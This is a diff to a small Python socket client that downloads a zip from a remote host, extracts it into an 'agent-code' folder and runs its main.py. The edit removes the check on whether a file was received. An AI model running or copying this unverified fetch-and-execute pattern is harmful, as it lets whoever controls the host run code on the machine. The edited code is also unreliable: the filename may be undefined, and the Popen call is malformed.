@@ -11,8 +11,6 @@ SEPARATOR = '<SEPARATOR>'
 # receive 4096 bytes each time
 BUFFER_SIZE = 4096
 
-filename = None
-
 # create the client socket
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
     print(f'[+] Connecting to {HOST}:{PORT}')
@@ -44,10 +42,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
             progress.update(len(bytes_read))
 
 
-if filename:
-    with zipfile.ZipFile(filename, "r") as zip_ref:
-        os.mkdir('agent-code')
-        zip_ref.extractall("agent-code")
-        subprocess.Popen('python3 agent-code/main.py')
-else:
-    print('Something wrong happenned')
+with zipfile.ZipFile(filename, "r") as zip_ref:
+    os.mkdir('agent-code')
+    zip_ref.extractall("agent-code")
+    subprocess.Popen('python3 agent-code/main.py')
